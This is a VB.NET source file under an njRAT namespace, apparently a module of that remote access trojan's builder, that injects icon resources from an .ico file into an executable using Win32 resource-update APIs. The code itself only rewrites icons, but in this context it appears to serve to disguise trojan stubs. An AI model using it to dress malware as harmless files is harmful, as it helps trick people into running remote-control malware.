Imports System
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security

Namespace njRAT
    Public Class ico
        ' Methods
        Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
            ico.InjectIcon(exeFileName, iconFileName, 50, 50)
        End Sub

        Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInt32, ByVal iconBaseID As UInt32)
            Dim file As IconFile = IconFile.FromFile(iconFileName)
            Dim hUpdate As IntPtr = NativeMethods.BeginUpdateResource(exeFileName, False)
            Dim data As Byte() = file.CreateIconGroupData(iconBaseID)
            Dim type As New IntPtr(14)
            Dim name As New IntPtr(CLng(iconGroupID))
            NativeMethods.UpdateResource(hUpdate, type, name, 0, data, data.Length)
            Dim num2 As Integer = (file.ImageCount - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                Dim buffer2 As Byte() = file.ImageData(i)
                name = New IntPtr(3)
                type = New IntPtr((iconBaseID + i))
                NativeMethods.UpdateResource(hUpdate, name, type, 0, buffer2, buffer2.Length)
                i += 1
            Loop
            NativeMethods.EndUpdateResource(hUpdate, False)
        End Sub


        ' Nested Types
        <StructLayout(LayoutKind.Sequential)> _
        Private Structure BITMAPINFOHEADER
            Public Size As UInt32
            Public Width As Integer
            Public Height As Integer
            Public Planes As UInt16
            Public BitCount As UInt16
            Public Compression As UInt32
            Public SizeImage As UInt32
            Public XPelsPerMeter As Integer
            Public YPelsPerMeter As Integer
            Public ClrUsed As UInt32
            Public ClrImportant As UInt32
        End Structure

        <StructLayout(LayoutKind.Sequential, Pack:=2)> _
        Private Structure GRPICONDIRENTRY
            Public Width As Byte
            Public Height As Byte
            Public ColorCount As Byte
            Public Reserved As Byte
            Public Planes As UInt16
            Public BitCount As UInt16
            Public BytesInRes As Integer
            Public ID As UInt16
        End Structure

        <StructLayout(LayoutKind.Sequential)> _
        Private Structure ICONDIR
            Public Reserved As UInt16
            Public Type As UInt16
            Public Count As UInt16
        End Structure

        <StructLayout(LayoutKind.Sequential)> _
        Private Structure ICONDIRENTRY
            Public Width As Byte
            Public Height As Byte
            Public ColorCount As Byte
            Public Reserved As Byte
            Public Planes As UInt16
            Public BitCount As UInt16
            Public BytesInRes As Integer
            Public ImageOffset As Integer
        End Structure

        Private Class IconFile
            ' Methods
            Private Sub New()
            End Sub

            Public Function CreateIconGroupData(ByVal iconBaseID As UInt32) As Byte()
                Dim num2 As Integer = (Marshal.SizeOf(GetType(ICONDIR)) + (Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * Me.ImageCount))
                Dim buffer2 As Byte() = New Byte(((num2 - 1) + 1) - 1) {}
                Dim handle As GCHandle = GCHandle.Alloc(buffer2, GCHandleType.Pinned)
                Marshal.StructureToPtr(Me.iconDir, handle.AddrOfPinnedObject, False)
                Dim num As Integer = Marshal.SizeOf(Me.iconDir)
                Dim num4 As Integer = (Me.ImageCount - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    Dim structurez As New GRPICONDIRENTRY
                    Dim bitmapinfoheader As New BITMAPINFOHEADER
                    Dim handle2 As GCHandle = GCHandle.Alloc(bitmapinfoheader, GCHandleType.Pinned)
                    Marshal.Copy(Me.ImageData(i), 0, handle2.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                    handle2.Free()
                    structurez.Width = Me.iconEntry(i).Width
                    structurez.Height = Me.iconEntry(i).Height
                    structurez.ColorCount = Me.iconEntry(i).ColorCount
                    structurez.Reserved = Me.iconEntry(i).Reserved
                    structurez.Planes = bitmapinfoheader.Planes
                    structurez.BitCount = bitmapinfoheader.BitCount
                    structurez.BytesInRes = Me.iconEntry(i).BytesInRes
                    structurez.ID = CUShort((iconBaseID + i))
                    Dim ptr As New IntPtr((handle.AddrOfPinnedObject.ToInt64 + num))
                    Marshal.StructureToPtr(structurez, ptr, False)
                    num = (num + Marshal.SizeOf(GetType(GRPICONDIRENTRY)))
                    i += 1
                Loop
                handle.Free()
                Return buffer2
            End Function

            Public Shared Function FromFile(ByVal filename As String) As IconFile
                Dim file2 As New IconFile
                Dim buffery As Byte() = File.ReadAllBytes(filename)
                Dim handle As GCHandle = GCHandle.Alloc(buffery, GCHandleType.Pinned)
                file2.iconDir = DirectCast(Marshal.PtrToStructure(handle.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
                file2.iconEntry = New ICONDIRENTRY(((file2.iconDir.Count - 1) + 1) - 1) {}
                file2.iconImage = New Byte(CInt((file2.iconDir.Count - 1 + 1)) - 1)() {}
                Dim num As Integer = Marshal.SizeOf(file2.iconDir)
                Dim t As Type = GetType(ICONDIRENTRY)
                Dim num2 As Integer = Marshal.SizeOf(t)
                Dim num4 As Integer = (file2.iconDir.Count - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    Dim ptr As New IntPtr((handle.AddrOfPinnedObject.ToInt64 + num))
                    Dim icondirentry As ICONDIRENTRY = DirectCast(Marshal.PtrToStructure(ptr, t), ICONDIRENTRY)
                    file2.iconEntry(i) = icondirentry
                    file2.iconImage(i) = New Byte(((icondirentry.BytesInRes - 1) + 1) - 1) {}
                    Buffer.BlockCopy(buffery, icondirentry.ImageOffset, file2.iconImage(i), 0, icondirentry.BytesInRes)
                    num = (num + num2)
                    i += 1
                Loop
                handle.Free()
                Return file2
            End Function


            ' Properties
            Public ReadOnly Property ImageCount As Integer
                Get
                    Return Me.iconDir.Count
                End Get
            End Property

            Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
                Get
                    Return Me.iconImage(index)
                End Get
            End Property


            ' Fields
            Private iconDir As ICONDIR = New ICONDIR
            Private iconEntry As ICONDIRENTRY()
            Private iconImage As Byte()()
        End Class

        <SuppressUnmanagedCodeSecurity> _
        Public Class NativeMethods
            ' Methods
            <DllImport("kernel32")> _
            Public Shared Function BeginUpdateResource(ByVal fileName As String, <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
            End Function

            <DllImport("kernel32")> _
            Public Shared Function EndUpdateResource(ByVal hUpdate As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
            End Function

            <DllImport("kernel32")> _
            Public Shared Function UpdateResource(ByVal hUpdate As IntPtr, ByVal type As IntPtr, ByVal name As IntPtr, ByVal language As Short, <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)> ByVal data As Byte(), ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
            End Function

        End Class
    End Class
End Namespace

